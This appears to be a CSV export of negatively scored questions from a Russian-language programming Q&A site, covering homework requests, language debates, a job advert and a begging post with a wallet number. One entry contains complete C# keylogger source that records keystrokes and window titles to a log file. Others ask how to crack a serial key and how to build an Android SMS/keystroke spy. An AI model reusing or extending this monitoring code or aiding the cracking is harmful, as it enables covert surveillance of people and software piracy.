Id,Title,Score,Body,Tags
"180049","Задача на массивы","-22","<p>Дана матрица А размером nxm. Найти в матрице  строки, где все элементы равны нулю. Написать программу и алгоритм.
Подскажите метод решения этой задачи.</p>

<p><img src=""https://i.imgur.com/ZwhmL.jpg"" alt=""""></p>
","|c#|"
"552241","Зачем нужен c++ , если есть c#?","-20","<p>Да, знаю, что холивар, но просто интересно. Недавно начал изучать java(я так понимаю java == c#), до этого более-менее разобрался с с++, и логично возникает такой вопрос зачем нужен c++, если c# намного практичней и удобней?</p>
","|c#|c++|"
"565415","Кряк программы / декомпиляция","-20","<p>Здравствуйте, у меня есть программа, там я пишу mail и serial key. Serial key генерируется каждый раз, когда пишу mail. Мне надо узнать этот serial key. Как я  могу это сделать? Могу  использовать декомпиляторы и т.д.? Пожалуйста, ответьте, срочно надо. Заранее спасибо!</p>
","|c#|c++|c|assembly|"
"667196","Помогите ! Нету денег(","-19","<p>Ребята помогите! Я клянусь Вам, нужно на хлеб! </p>

<p>Зарплата только через неделю, в кошельке - пусто... </p>

<p>Пожалуйста! </p>

<p>Помогите хоть какую-то копейку Qiwi - 380957630459. </p>

<p>МНЕ СТЫДНО ПРОСИТЬ! </p>

<p>Чувствую себя какой-то тварью... Но обстановка не айс... Кто чем может...<br>
Разбогатею - 10% Ваши. </p>

<p>Живу с бабушкой (она на пенсии), ладно не хочу давить на жалость.</p>
","|qiwi|"
"616758","Может кто объяснить, что делает каждая строка?","-18","<p>Саму программу я заказал мне её сделали и дали код, но если препод спросит нужно объяснить что делает какая либо строка. Программа для слежение за действиями в ПК. 
Программа была создана по теме Безопасности сети на базе Windows для конкретного предприятия.</p>

<pre><code>using System; 
using System.Collections.Generic; 
using System.ComponentModel; 
using System.Data; 
using System.Drawing; 
using System.Linq; 
using System.Text; 
using System.Threading.Tasks; 
using System.Windows.Forms; 
using System.IO; 
using System.Runtime.InteropServices; 
using System.Threading; 


namespace WindowsFormsApplication5 
{ 
    public partial class Form1 : Form 
    { 
        String u = """"; 
        public Form1() 
        { 
            InitializeComponent(); 
        } 

        [DllImport(""user32.dll"")] 
        public static extern int GetAsyncKeyState(Int32 i); 

        [DllImport(""user32.dll"")] 
        static extern int GetForegroundWindow(); 

        [DllImport(""user32.dll"")] 
        static extern int GetWindowText(int hWnd, StringBuilder text, int count); 

        private void Form1_Load(object sender, EventArgs e) 
        { 
        } 

        private void button1_Click(object sender, EventArgs e) 
        { 
            timer1.Enabled = true; 
        } 

        private void timer1_Tick(object sender, EventArgs e) 
        { 
            Class1 cl = new Class1(); 
            const int nChars = 256; 
            int handle = 0; 
            StringBuilder Buff = new StringBuilder(nChars); 
            String t=""""; 
            handle = GetForegroundWindow(); 

            if (GetWindowText(handle, Buff, nChars) &gt; 0) 
            { 
                t=(Buff.ToString()); 
                //IDWindowLabel.Text = handle.ToString(); 
            } 

            for (Int32 i = 0; i &lt; 255; i++) 
            { 
                int keyState = GetAsyncKeyState(i); 
                if (keyState == 1 || keyState == -32767) 
                { 
                    if (t == u) 
                    { 
                        textBox1.Text = textBox1.Text + cl.tx((((Keys)i).ToString())); 
                    } 
                    else 
                    { 
                        textBox1.Text = textBox1.Text+""\n""+ ""\n"" + t+"" : ""+ cl.tx((((Keys)i).ToString())); 
                        u = t; 
                    } 
                } 
            } 
        } 

        private void button2_Click(object sender, EventArgs e) 
        { 
        } 

        private void timer2_Tick(object sender, EventArgs e) 
        { 
            File.Delete(Application.StartupPath + @""\log.txt""); 
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(Application.StartupPath + @""\log.txt"", true)) 
            { 
                file.WriteLine(textBox1.Text); 
            } 
        } 
    } 
}
</code></pre>
","|c#|"
"646418","пж ответьте срочно","-18","<p>пж скажите перевод бессмертия на язык java</p>
","|java|"
"657536","Кто сможет написать работу в Delphi?","-18","<p><a href=""https://i.stack.imgur.com/IJ6HO.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/IJ6HO.jpg"" alt=""Нужно решить задачу №7 в Delphi. Очень нужна помощь. Потому что я очень глупенькая.""></a></p>

<p>На картинке представлены условия задачи. Повторяю, что нужно решить задачу №7.</p>
","|delphi|"
"555542","Какие темы учить чтоб создать смс шпион на Android?","-18","<p>решил начать учить Android.</p>

<p><strong>Вопрос</strong>: подскажите пожалуйста,как отслеживать нажатия ввода с клавиатуры, чтобы всё вводимое копировалось в отдельный текстовый файл?</p>
","|android|"
"516710","Влияет ли тату на трудоустройство программистом?","-18","<p>Я junior php developer. Работаю меньше года в этой области и все нравится, в планах изучать питон, учавствую в нескольких старт-апах, вобщем, перспекты есть.
Планирую сделать тату на руке. Как работодатели относятся к таким моментам? В принципе, кодер не общается с клиентами. Ну и интересно как относятся к тату мировые лидеры it (да-да, я тоже как и вы хочу работать в google:))</p>
","|любой-язык|"
"221047","На чём легче программировать","-17","<p>На чём легче (учится)программировать  на C# или на Delphi</p>","|c#|delphi|"
"497830","Выбор языка программирования","-16","<p>Здесь был бесполезный шлак, он удалён.</p>
","|c#|программирование|"
"666324","Могли бы Вы порекомендовать себя или знакомого на вакансию java или Frontend разработчик?","-16","<p>г.Москва, ст.м.Павелецкая/Электрозаводская. </p>

<p><strong>Чем будет заниматься Front-end разработчик:</strong>
-разработка пользовательских приложений совместно с дизайнерами;
-информирование дизайнеров по ограничениям, возникающих в процессе разработки, и помощь в разработке компромиссных решений;
-участие в интеграции frontend приложений и API вместе с backеnd разработчиками;
-создание модульных и интеграционных тестов, а также утилиты автоматизации постоянных задач.</p>

<p><strong>Чем будет заниматься java-рзработчик:</strong>  проекты на стеке технологий Java8, Spring (Spring Boot, MVC, Security, Data). Использовать подходы: Test-Driven Development (TDD), Continuous Integration/Continuous Delivery, работа в Agile команде. </p>

<p><strong>Наши условия:</strong></p>

<ul>
<li>официальное оформление, полностью ""белая"" заработная плата;</li>
<li>5 рабочих дней в неделю, возможность гибкого графика;</li>
<li>ДМС с обслуживанием в лучших клиниках города, включая стоматологию;</li>
<li>Бонусы на обучение иностранным языкам, участие в конференциях, занятия физкультурой и спортом и не только;</li>
<li>Уютная атмосфера — позитивный и отзывчивый коллектив;</li>
<li>Хорошее оснащение рабочего места;</li>
<li>Свободный дресс-код.</li>
</ul>

<p><em>Пиши,звони,комментируй:</em> +74997034545, ym@opendev.com, можно в <a href=""https://vk.com/id424650426"" rel=""nofollow noreferrer"">https://vk.com/id424650426</a></p>
","|javascript|java|spring|frontend|работа|"
"641935","Помогите переписать часть кода Python на чистый JS, для получения аналогий с другими языками","-16","<p>Вот часть кода(Евклидово расстояние)алгоритма классификации k-ближайших соседей с Python на чистый JS. </p>

<pre><code>def euclideanDistance(instance1, instance2, length):
    distance = 0
    for x in range(length):
        distance += pow((instance1[x] - instance2[x]), 2)
    return math.sqrt(distance)
</code></pre>

<p>Буду благодарен за любую помощь!</p>
","|javascript|python|алгоритм|классификация|"
